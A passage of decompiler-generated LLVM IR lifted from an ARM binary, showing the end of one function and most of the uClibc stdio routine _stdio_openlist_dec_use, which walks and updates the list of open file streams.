  uselistorder i32 %arg3, { 0, 1, 2, 4, 3, 5 }
  uselistorder label %dec_label_pc_177ec, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_177c4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_177ac, { 1, 0 }
  uselistorder label %dec_label_pc_1775c, { 1, 0 }
  uselistorder label %dec_label_pc_17750, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %dec_label_pc_17740, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17728, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_177f8 = load i32, i32* @r4, align 4
  store i32 %v3_177f8, i32* %stack_var_-20, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23378.488 to i32), i32* %r5.global-to-local, align 4
  %v4_17808 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 160) to i32*), align 4
  store i32 %v4_17808, i32* %r7.global-to-local, align 4
  %v0_1780c = call i32 @__aeabi_read_tp()
  store i32 %v0_1780c, i32* %r0.global-to-local, align 4
  %v1_17810 = add i32 %v4_17808, 8
  %v2_17810 = inttoptr i32 %v1_17810 to i32*
  %v3_17810 = load i32, i32* %v2_17810, align 4
  store i32 %v3_17810, i32* %r3.global-to-local, align 4
  %v1_17814 = add i32 %v0_1780c, -1168
  store i32 %v1_17814, i32* %r6.global-to-local, align 4
  %v3_17818 = icmp uge i32 %v3_17810, %v1_17814
  store i1 %v3_17818, i1* %cpsr_c.global-to-local, align 1
  %v9_17818 = icmp eq i32 %v3_17810, %v1_17814
  br i1 %v9_17818, label %dec_label_pc_17864, label %dec_label_pc_17824

dec_label_pc_17824:                               ; preds = %entry
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_17808, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_1783093 = inttoptr i32 %v4_17808 to i32*
  %v2_1783094 = load i32, i32* %v1_1783093, align 4
  store i32 %v2_1783094, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1783496 = icmp eq i32 %v2_1783094, 0
  br i1 %v9_1783496, label %dec_label_pc_1783c, label %dec_label_pc_17854

dec_label_pc_1783c:                               ; preds = %dec_label_pc_17824, %dec_label_pc_1783c.dec_label_pc_17830_crit_edge
  %v0_1783c97 = phi i32 [ %v1_17834.pre, %dec_label_pc_1783c.dec_label_pc_17830_crit_edge ], [ 0, %dec_label_pc_17824 ]
  store i32 %v0_1783c97, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1784c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1784c, label %dec_label_pc_17850, label %dec_label_pc_1783c.dec_label_pc_17830_crit_edge

dec_label_pc_1783c.dec_label_pc_17830_crit_edge:  ; preds = %dec_label_pc_1783c
  %v0_17830.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17834.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_17830 = inttoptr i32 %v0_17830.pre to i32*
  %v2_17830 = load i32, i32* %v1_17830, align 4
  store i32 %v2_17830, i32* %r3.global-to-local, align 4
  %v3_17834 = icmp uge i32 %v2_17830, %v1_17834.pre
  store i1 %v3_17834, i1* %cpsr_c.global-to-local, align 1
  %v9_17834 = icmp eq i32 %v2_17830, %v1_17834.pre
  br i1 %v9_17834, label %dec_label_pc_1783c, label %dec_label_pc_17854

dec_label_pc_17850:                               ; preds = %dec_label_pc_1783c
  %v0_17850 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_17850, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17854

dec_label_pc_17854:                               ; preds = %dec_label_pc_17824, %dec_label_pc_1783c.dec_label_pc_17830_crit_edge, %dec_label_pc_17850
  %v0_17854 = phi i32 [ %v0_17850, %dec_label_pc_17850 ], [ %v2_1783094, %dec_label_pc_17824 ], [ %v2_17830, %dec_label_pc_1783c.dec_label_pc_17830_crit_edge ]
  %v1_17854 = phi i32 [ %v0_17850, %dec_label_pc_17850 ], [ 0, %dec_label_pc_17824 ], [ %v1_17834.pre, %dec_label_pc_1783c.dec_label_pc_17830_crit_edge ]
  %v3_17854 = icmp uge i32 %v0_17854, %v1_17854
  store i1 %v3_17854, i1* %cpsr_c.global-to-local, align 1
  %v9_17854 = icmp eq i32 %v0_17854, %v1_17854
  br i1 %v9_17854, label %bb45, label %bb

bb:                                               ; preds = %dec_label_pc_17854
  %v1_17858 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_17858, i32* %r0.global-to-local, align 4
  br label %bb45

bb45:                                             ; preds = %dec_label_pc_17854, %bb
  %v1_1785c = xor i1 %v9_17854, true
  call void @__pseudo_cond_branch(i1 %v1_1785c, i32 ptrtoint (i32* @global_var_15400.643 to i32))
  %v0_17860 = load i32, i32* %r6.global-to-local, align 4
  %v1_17860 = load i32, i32* %r7.global-to-local, align 4
  %v2_17860 = add i32 %v1_17860, 8
  %v3_17860 = inttoptr i32 %v2_17860 to i32*
  store i32 %v0_17860, i32* %v3_17860, align 4
  br label %dec_label_pc_17864

dec_label_pc_17864:                               ; preds = %entry, %bb45
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_17868 = load i32, i32* %r5.global-to-local, align 4
  %v2_17868 = add i32 %v0_17868, 160
  %v3_17868 = inttoptr i32 %v2_17868 to i32*
  %v4_17868 = load i32, i32* %v3_17868, align 4
  store i32 %v4_17868, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_17870 = add i32 %v0_17868, 12
  %v3_17870 = inttoptr i32 %v2_17870 to i32*
  %v4_17870 = load i32, i32* %v3_17870, align 4
  store i32 %v4_17870, i32* %r3.global-to-local, align 4
  %v1_17874 = inttoptr i32 %v4_17870 to i32*
  %v2_17874 = load i32, i32* %v1_17874, align 4
  store i32 %v2_17874, i32* %r1.global-to-local, align 4
  %v1_17878 = add i32 %v4_17868, 4
  %v2_17878 = inttoptr i32 %v1_17878 to i32*
  %v3_17878 = load i32, i32* %v2_17878, align 4
  %v2_1787c = icmp ne i32 %v2_17874, 0
  store i1 %v2_1787c, i1* %cpsr_c.global-to-local, align 1
  %v7_1787c = icmp eq i32 %v2_17874, 1
  %v1_17880 = add i32 %v3_17878, 1
  store i32 %v1_17880, i32* %r3.global-to-local, align 4
  store i32 %v1_17880, i32* %v2_17878, align 4
  br i1 %v7_1787c, label %dec_label_pc_1788c, label %dec_label_pc_179f0

dec_label_pc_1788c:                               ; preds = %dec_label_pc_17864
  store i32 80, i32* %r3.global-to-local, align 4
  %v0_17890 = load i32, i32* %r5.global-to-local, align 4
  %v2_17890 = add i32 %v0_17890, 80
  %v3_17890 = inttoptr i32 %v2_17890 to i32*
  %v4_17890 = load i32, i32* %v3_17890, align 4
  store i32 %v4_17890, i32* %r3.global-to-local, align 4
  %v1_17894 = inttoptr i32 %v4_17890 to i32*
  %v2_17894 = load i32, i32* %v1_17894, align 4
  store i32 %v2_17894, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp46 = icmp slt i32 %v2_17894, 1
  br i1 %tmp46, label %dec_label_pc_179f0, label %dec_label_pc_178a0

dec_label_pc_178a0:                               ; preds = %dec_label_pc_1788c
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_178a4 = add i32 %v0_17890, 152
  %v3_178a4 = inttoptr i32 %v2_178a4 to i32*
  %v4_178a4 = load i32, i32* %v3_178a4, align 4
  store i32 %v4_178a4, i32* %r7.global-to-local, align 4
  %v1_178a8 = add i32 %v4_178a4, 8
  %v2_178a8 = inttoptr i32 %v1_178a8 to i32*
  %v3_178a8 = load i32, i32* %v2_178a8, align 4
  store i32 %v3_178a8, i32* %r3.global-to-local, align 4
  %v1_178ac = load i32, i32* %r6.global-to-local, align 4
  %v3_178ac = icmp uge i32 %v3_178a8, %v1_178ac
  store i1 %v3_178ac, i1* %cpsr_c.global-to-local, align 1
  %v9_178ac = icmp eq i32 %v3_178a8, %v1_178ac
  br i1 %v9_178ac, label %dec_label_pc_178f0, label %dec_label_pc_178b4

dec_label_pc_178b4:                               ; preds = %dec_label_pc_178a0
  store i32 %v4_178a4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_178bc86 = inttoptr i32 %v4_178a4 to i32*
  %v2_178bc87 = load i32, i32* %v1_178bc86, align 4
  store i32 %v2_178bc87, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_178c089 = icmp eq i32 %v2_178bc87, 0
  br i1 %v9_178c089, label %dec_label_pc_178c8, label %dec_label_pc_178e0

dec_label_pc_178c8:                               ; preds = %dec_label_pc_178b4, %dec_label_pc_178c8.dec_label_pc_178bc_crit_edge
  %v0_178c890 = phi i32 [ %v1_178c0.pre, %dec_label_pc_178c8.dec_label_pc_178bc_crit_edge ], [ 0, %dec_label_pc_178b4 ]
  store i32 %v0_178c890, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_178d8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_178d8, label %dec_label_pc_178dc, label %dec_label_pc_178c8.dec_label_pc_178bc_crit_edge

dec_label_pc_178c8.dec_label_pc_178bc_crit_edge:  ; preds = %dec_label_pc_178c8
  %v0_178bc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_178c0.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_178bc = inttoptr i32 %v0_178bc.pre to i32*
  %v2_178bc = load i32, i32* %v1_178bc, align 4
  store i32 %v2_178bc, i32* %r3.global-to-local, align 4
  %v3_178c0 = icmp uge i32 %v2_178bc, %v1_178c0.pre
  store i1 %v3_178c0, i1* %cpsr_c.global-to-local, align 1
  %v9_178c0 = icmp eq i32 %v2_178bc, %v1_178c0.pre
  br i1 %v9_178c0, label %dec_label_pc_178c8, label %dec_label_pc_178e0

dec_label_pc_178dc:                               ; preds = %dec_label_pc_178c8
  %v0_178dc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_178dc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_178e0

dec_label_pc_178e0:                               ; preds = %dec_label_pc_178b4, %dec_label_pc_178c8.dec_label_pc_178bc_crit_edge, %dec_label_pc_178dc
  %v0_178e0 = phi i32 [ %v0_178dc, %dec_label_pc_178dc ], [ %v2_178bc87, %dec_label_pc_178b4 ], [ %v2_178bc, %dec_label_pc_178c8.dec_label_pc_178bc_crit_edge ]
  %v1_178e0 = phi i32 [ %v0_178dc, %dec_label_pc_178dc ], [ 0, %dec_label_pc_178b4 ], [ %v1_178c0.pre, %dec_label_pc_178c8.dec_label_pc_178bc_crit_edge ]
  %v3_178e0 = icmp uge i32 %v0_178e0, %v1_178e0
  store i1 %v3_178e0, i1* %cpsr_c.global-to-local, align 1
  %v9_178e0 = icmp eq i32 %v0_178e0, %v1_178e0
  br i1 %v9_178e0, label %bb48, label %bb47

bb47:                                             ; preds = %dec_label_pc_178e0
  %v1_178e4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_178e4, i32* %r0.global-to-local, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_178e0, %bb47
  %v1_178e8 = xor i1 %v9_178e0, true
  call void @__pseudo_cond_branch(i1 %v1_178e8, i32 ptrtoint (i32* @global_var_15400.643 to i32))
  %v0_178ec = load i32, i32* %r6.global-to-local, align 4
  %v1_178ec = load i32, i32* %r7.global-to-local, align 4
  %v2_178ec = add i32 %v1_178ec, 8
  %v3_178ec = inttoptr i32 %v2_178ec to i32*
  store i32 %v0_178ec, i32* %v3_178ec, align 4
  %v0_178f8.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_178f0

dec_label_pc_178f0:                               ; preds = %dec_label_pc_178a0, %bb48
  %v0_178f8 = phi i32 [ %v0_17890, %dec_label_pc_178a0 ], [ %v0_178f8.pre, %bb48 ]
  store i32 152, i32* %r3.global-to-local, align 4
  store i32 76, i32* %r1.global-to-local, align 4
  %v2_178f8 = add i32 %v0_178f8, 152
  %v3_178f8 = inttoptr i32 %v2_178f8 to i32*
  %v4_178f8 = load i32, i32* %v3_178f8, align 4
  store i32 %v4_178f8, i32* %r0.global-to-local, align 4
  %v2_178fc = add i32 %v0_178f8, 76
  %v3_178fc = inttoptr i32 %v2_178fc to i32*
  %v4_178fc = load i32, i32* %v3_178fc, align 4
  store i32 %v4_178fc, i32* %r2.global-to-local, align 4
  %v1_17900 = add i32 %v4_178f8, 4
  %v2_17900 = inttoptr i32 %v1_17900 to i32*
  %v3_17900 = load i32, i32* %v2_17900, align 4
  store i32 %v3_17900, i32* %r3.global-to-local, align 4
  %v1_17904 = inttoptr i32 %v4_178fc to i32*
  %v2_17904 = load i32, i32* %v1_17904, align 4
  store i32 %v2_17904, i32* %r2.global-to-local, align 4
  %v1_17908 = add i32 %v3_17900, 1
  store i32 %v1_17908, i32* %r3.global-to-local, align 4
  store i32 76, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %v1_17908, i32* %v2_17900, align 4
  %v0_17958.pr = load i32, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1795811 = icmp eq i32 %v0_17958.pr, 0
  store i32 32816, i32* %r1.global-to-local, align 4
  br i1 %v2_1795811, label %dec_label_pc_17964, label %dec_label_pc_1791c

dec_label_pc_1791c:                               ; preds = %dec_label_pc_178f0, %dec_label_pc_17954
  %v0_179402 = phi i32 [ %v0_17954, %dec_label_pc_17954 ], [ %v0_17958.pr, %dec_label_pc_178f0 ]
  %v1_1791c = inttoptr i32 %v0_179402 to i16*
  %v2_1791c = load i16, i16* %v1_1791c, align 2
  %v3_1791c = zext i16 %v2_1791c to i32
  store i32 %v3_1791c, i32* %r3.global-to-local, align 4
  %v2_17920 = and i32 %v3_1791c, 32816
  store i32 %v2_17920, i32* %r1.global-to-local, align 4
  %v2_17924 = icmp ugt i32 %v2_17920, 47
  store i1 %v2_17924, i1* %cpsr_c.global-to-local, align 1
  %v7_17924 = icmp eq i32 %v2_17920, 48
  %v1_17928 = add i32 %v0_179402, 32
  %v2_17928 = inttoptr i32 %v1_17928 to i32*
  %v3_17928 = load i32, i32* %v2_17928, align 4
  store i32 %v3_17928, i32* %r4.global-to-local, align 4
  br i1 %v7_17924, label %dec_label_pc_17934, label %.thread38

.thread38:                                        ; preds = %dec_label_pc_1791c
  store i32 %v0_179402, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_17954

dec_label_pc_17934:                               ; preds = %dec_label_pc_1791c
  %v0_17934 = load i32, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17934 = icmp eq i32 %v0_17934, 0
  br i1 %v2_17934, label %.thread, label %bb49

.thread:                                          ; preds = %dec_label_pc_17934
  %v1_17938 = load i32, i32* %r5.global-to-local, align 4
  %v2_17938 = load i32, i32* %r7.global-to-local, align 4
  %v3_17938 = add i32 %v2_17938, %v1_17938
  %v4_17938 = inttoptr i32 %v3_17938 to i32*
  %v5_17938 = load i32, i32* %v4_17938, align 4
  store i32 %v5_17938, i32* %r3.global-to-local, align 4
  %v3_1793c = inttoptr i32 %v5_17938 to i32*
  store i32 %v3_17928, i32* %v3_1793c, align 4
  %v0_17940 = load i32, i32* %r2.global-to-local, align 4
  %v1_17940 = inttoptr i32 %v0_17940 to i16*
  %v2_17940 = load i16, i16* %v1_17940, align 2
  %v3_17940 = zext i16 %v2_17940 to i32
  store i32 %v3_17940, i32* %r3.global-to-local, align 4
  br label %bb50

bb49:                                             ; preds = %dec_label_pc_17934
  %v2_179408 = load i16, i16* %v1_1791c, align 2
  %v3_179409 = zext i16 %v2_179408 to i32
  store i32 %v3_179409, i32* %r3.global-to-local, align 4
  %v3_17944 = add i32 %v0_17934, 32
  %v4_17944 = inttoptr i32 %v3_17944 to i32*
  store i32 %v3_17928, i32* %v4_17944, align 4
  %v0_17948.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb50

bb50:                                             ; preds = %.thread, %bb49
  %v0_17948 = phi i32 [ %v3_17940, %.thread ], [ %v0_17948.pre, %bb49 ]
  %v1_17948 = and i32 %v0_17948, 8192
  %v2_17948 = icmp eq i32 %v1_17948, 0
  br i1 %v2_17948, label %bb52, label %bb51

bb51:                                             ; preds = %bb50
  %v1_1794c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_1794c, i32* %r0.global-to-local, align 4
  br label %bb52

bb52:                                             ; preds = %bb50, %bb51
  %v1_17950 = xor i1 %v2_17948, true
  call void @__pseudo_cond_branch(i1 %v1_17950, i32 ptrtoint (i32* @global_var_1445c.64 to i32))
  %v0_17954.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_17954

dec_label_pc_17954:                               ; preds = %.thread38, %bb52
  %v0_17954 = phi i32 [ %v0_17954.pre, %bb52 ], [ %v3_17928, %.thread38 ]
  store i32 %v0_17954, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17958 = icmp eq i32 %v0_17954, 0
  store i32 32816, i32* %r1.global-to-local, align 4
  br i1 %v2_17958, label %dec_label_pc_17964, label %dec_label_pc_1791c

dec_label_pc_17964:                               ; preds = %dec_label_pc_17954, %dec_label_pc_178f0
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_17968 = load i32, i32* %r5.global-to-local, align 4
  %v2_17968 = add i32 %v0_17968, 152
  %v3_17968 = inttoptr i32 %v2_17968 to i32*
  %v4_17968 = load i32, i32* %v3_17968, align 4
  store i32 %v4_17968, i32* %r0.global-to-local, align 4
  %v1_1796c = add i32 %v4_17968, 4
  %v2_1796c = inttoptr i32 %v1_1796c to i32*
  %v3_1796c = load i32, i32* %v2_1796c, align 4
  %v1_17970 = add i32 %v3_1796c, -1
  store i32 %v1_17970, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17974 = icmp eq i32 %v1_17970, 0
  store i32 %v1_17970, i32* %v2_1796c, align 4
  br i1 %v2_17974, label %dec_label_pc_17980, label %dec_label_pc_179e0

dec_label_pc_17980:                               ; preds = %dec_label_pc_17964
  %v0_17980 = load i32, i32* %r3.global-to-local, align 4
  %v1_17980 = load i32, i32* %r0.global-to-local, align 4
  %v2_17980 = add i32 %v1_17980, 8
  %v3_17980 = inttoptr i32 %v2_17980 to i32*
  store i32 %v0_17980, i32* %v3_17980, align 4
  %v0_17984 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_17984, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_17988

dec_label_pc_17988:                               ; preds = %dec_label_pc_179b8.dec_label_pc_17988_crit_edge, %dec_label_pc_17980
  %v0_17988 = phi i32 [ %v0_17988.pre, %dec_label_pc_179b8.dec_label_pc_17988_crit_edge ], [ %v0_17984, %dec_label_pc_17980 ]
  %v1_17988 = inttoptr i32 %v0_17988 to i32*
  %v2_17988 = load i32, i32* %v1_17988, align 4
  store i32 %v2_17988, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_17988, i32* %r2.global-to-local, align 4
  %v2_1799474 = load i32, i32* %v1_17988, align 4
  store i32 %v2_1799474, i32* %r3.global-to-local, align 4
  %v3_1799876 = icmp uge i32 %v2_1799474, %v2_17988
  store i1 %v3_1799876, i1* %cpsr_c.global-to-local, align 1
  %v9_1799882 = icmp eq i32 %v2_1799474, %v2_17988
  br i1 %v9_1799882, label %dec_label_pc_179a0, label %dec_label_pc_179b8

dec_label_pc_179a0:                               ; preds = %dec_label_pc_17988, %dec_label_pc_179a0.dec_label_pc_17994_crit_edge
  %v0_179a083 = phi i32 [ %v1_17998.pre, %dec_label_pc_179a0.dec_label_pc_17994_crit_edge ], [ %v2_17988, %dec_label_pc_17988 ]
  store i32 %v0_179a083, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_179b0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_179b0, label %dec_label_pc_179b4, label %dec_label_pc_179a0.dec_label_pc_17994_crit_edge

dec_label_pc_179a0.dec_label_pc_17994_crit_edge:  ; preds = %dec_label_pc_179a0
  %v0_17994.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17998.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_17994 = inttoptr i32 %v0_17994.pre to i32*
  %v2_17994 = load i32, i32* %v1_17994, align 4
  store i32 %v2_17994, i32* %r3.global-to-local, align 4
  %v3_17998 = icmp uge i32 %v2_17994, %v1_17998.pre
  store i1 %v3_17998, i1* %cpsr_c.global-to-local, align 1
  %v9_17998 = icmp eq i32 %v2_17994, %v1_17998.pre
  br i1 %v9_17998, label %dec_label_pc_179a0, label %dec_label_pc_179b8

dec_label_pc_179b4:                               ; preds = %dec_label_pc_179a0
  %v0_179b4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_179b4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_179b8

dec_label_pc_179b8:                               ; preds = %dec_label_pc_17988, %dec_label_pc_179a0.dec_label_pc_17994_crit_edge, %dec_label_pc_179b4
  %v0_179c0 = phi i32 [ %v0_179b4, %dec_label_pc_179b4 ], [ %v2_1799474, %dec_label_pc_17988 ], [ %v2_17994, %dec_label_pc_179a0.dec_label_pc_17994_crit_edge ]
  %v1_179b8 = phi i32 [ %v0_179b4, %dec_label_pc_179b4 ], [ %v2_17988, %dec_label_pc_17988 ], [ %v1_17998.pre, %dec_label_pc_179a0.dec_label_pc_17994_crit_edge ]
  %v3_179b8 = icmp uge i32 %v0_179c0, %v1_179b8
  store i1 %v3_179b8, i1* %cpsr_c.global-to-local, align 1
  %v9_179b8 = icmp eq i32 %v0_179c0, %v1_179b8
  br i1 %v9_179b8, label %dec_label_pc_179c0, label %dec_label_pc_179b8.dec_label_pc_17988_crit_edge

dec_label_pc_179b8.dec_label_pc_17988_crit_edge:  ; preds = %dec_label_pc_179b8
  %v0_17988.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_17988

dec_label_pc_179c0:                               ; preds = %dec_label_pc_179b8
  %v2_179c0 = icmp ne i32 %v1_179b8, 0
  store i1 %v2_179c0, i1* %cpsr_c.global-to-local, align 1
  %v7_179c4 = icmp slt i32 %v1_179b8, 2
  br i1 %v7_179c4, label %dec_label_pc_179e0, label %dec_label_pc_179c8

dec_label_pc_179c8:                               ; preds = %dec_label_pc_179c0
  %v0_179c8 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_179c8, i32* %r0.global-to-local, align 4
  %v0_179cc = load i32, i32* %r1.global-to-local, align 4
  %v1_179cc = add i32 %v0_179cc, 129
  store i32 %v1_179cc, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_179e0

dec_label_pc_179e0:                               ; preds = %dec_label_pc_17964, %dec_label_pc_179c8, %dec_label_pc_179c0
  store i32 80, i32* %r3.global-to-local, align 4
  %v0_179e4 = load i32, i32* %r5.global-to-local, align 4
  %v2_179e4 = add i32 %v0_179e4, 80
  %v3_179e4 = inttoptr i32 %v2_179e4 to i32*
  %v4_179e4 = load i32, i32* %v3_179e4, align 4
  store i32 %v4_179e4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_179ec = inttoptr i32 %v4_179e4 to i32*
  store i32 0, i32* %v2_179ec, align 4
  br label %dec_label_pc_179f0

dec_label_pc_179f0:                               ; preds = %dec_label_pc_17864, %dec_label_pc_1788c, %dec_label_pc_179e0
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_179f4 = load i32, i32* %r5.global-to-local, align 4
  %v2_179f4 = add i32 %v0_179f4, 160
  %v3_179f4 = inttoptr i32 %v2_179f4 to i32*
  %v4_179f4 = load i32, i32* %v3_179f4, align 4
  store i32 %v4_179f4, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_179fc = add i32 %v0_179f4, 12
  %v3_179fc = inttoptr i32 %v2_179fc to i32*
  %v4_179fc = load i32, i32* %v3_179fc, align 4
  store i32 %v4_179fc, i32* %r1.global-to-local, align 4
  %v1_17a00 = add i32 %v4_179f4, 4
  %v2_17a00 = inttoptr i32 %v1_17a00 to i32*
  %v3_17a00 = load i32, i32* %v2_17a00, align 4
  store i32 %v3_17a00, i32* %r2.global-to-local, align 4
  %v1_17a04 = inttoptr i32 %v4_179fc to i32*
  %v2_17a04 = load i32, i32* %v1_17a04, align 4
  %v1_17a08 = add i32 %v3_17a00, -1
  store i32 %v1_17a08, i32* %r2.global-to-local, align 4
  %v1_17a0c = add i32 %v2_17a04, -1
  store i32 %v1_17a0c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17a10 = icmp eq i32 %v1_17a08, 0
  store i32 %v1_17a0c, i32* %v1_17a04, align 4
  %v0_17a18 = load i32, i32* %r2.global-to-local, align 4
  %v1_17a18 = load i32, i32* %r0.global-to-local, align 4
  %v2_17a18 = add i32 %v1_17a18, 4
  %v3_17a18 = inttoptr i32 %v2_17a18 to i32*
  store i32 %v0_17a18, i32* %v3_17a18, align 4
  br i1 %v2_17a10, label %dec_label_pc_17a20, label %dec_label_pc_17a80

dec_label_pc_17a20:                               ; preds = %dec_label_pc_179f0
  %v0_17a20 = load i32, i32* %r2.global-to-local, align 4
  %v1_17a20 = load i32, i32* %r0.global-to-local, align 4
  %v2_17a20 = add i32 %v1_17a20, 8
  %v3_17a20 = inttoptr i32 %v2_17a20 to i32*
  store i32 %v0_17a20, i32* %v3_17a20, align 4
  %v0_17a24 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_17a24, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_17a28

dec_label_pc_17a28:                               ; preds = %dec_label_pc_17a58.dec_label_pc_17a28_crit_edge, %dec_label_pc_17a20
  %v0_17a28 = phi i32 [ %v0_17a28.pre, %dec_label_pc_17a58.dec_label_pc_17a28_crit_edge ], [ %v0_17a24, %dec_label_pc_17a20 ]
  %v1_17a28 = inttoptr i32 %v0_17a28 to i32*
  %v2_17a28 = load i32, i32* %v1_17a28, align 4
  store i32 %v2_17a28, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_17a28, i32* %r2.global-to-local, align 4
  %v2_17a3462 = load i32, i32* %v1_17a28, align 4
  store i32 %v2_17a3462, i32* %r3.global-to-local, align 4
  %v3_17a3864 = icmp uge i32 %v2_17a3462, %v2_17a28
  store i1 %v3_17a3864, i1* %cpsr_c.global-to-local, align 1
  %v9_17a3870 = icmp eq i32 %v2_17a3462, %v2_17a28
  br i1 %v9_17a3870, label %dec_label_pc_17a40, label %dec_label_pc_17a58

dec_label_pc_17a40:                               ; preds = %dec_label_pc_17a28, %dec_label_pc_17a40.dec_label_pc_17a34_crit_edge
  %v0_17a4071 = phi i32 [ %v1_17a38.pre, %dec_label_pc_17a40.dec_label_pc_17a34_crit_edge ], [ %v2_17a28, %dec_label_pc_17a28 ]
  store i32 %v0_17a4071, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17a50 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17a50, label %dec_label_pc_17a54, label %dec_label_pc_17a40.dec_label_pc_17a34_crit_edge

dec_label_pc_17a40.dec_label_pc_17a34_crit_edge:  ; preds = %dec_label_pc_17a40
  %v0_17a34.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17a38.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_17a34 = inttoptr i32 %v0_17a34.pre to i32*
  %v2_17a34 = load i32, i32* %v1_17a34, align 4
  store i32 %v2_17a34, i32* %r3.global-to-local, align 4
  %v3_17a38 = icmp uge i32 %v2_17a34, %v1_17a38.pre
  store i1 %v3_17a38, i1* %cpsr_c.global-to-local, align 1
  %v9_17a38 = icmp eq i32 %v2_17a34, %v1_17a38.pre
  br i1 %v9_17a38, label %dec_label_pc_17a40, label %dec_label_pc_17a58

dec_label_pc_17a54:                               ; preds = %dec_label_pc_17a40
  %v0_17a54 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_17a54, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17a58

dec_label_pc_17a58:                               ; preds = %dec_label_pc_17a28, %dec_label_pc_17a40.dec_label_pc_17a34_crit_edge, %dec_label_pc_17a54
  %v0_17a60 = phi i32 [ %v0_17a54, %dec_label_pc_17a54 ], [ %v2_17a3462, %dec_label_pc_17a28 ], [ %v2_17a34, %dec_label_pc_17a40.dec_label_pc_17a34_crit_edge ]
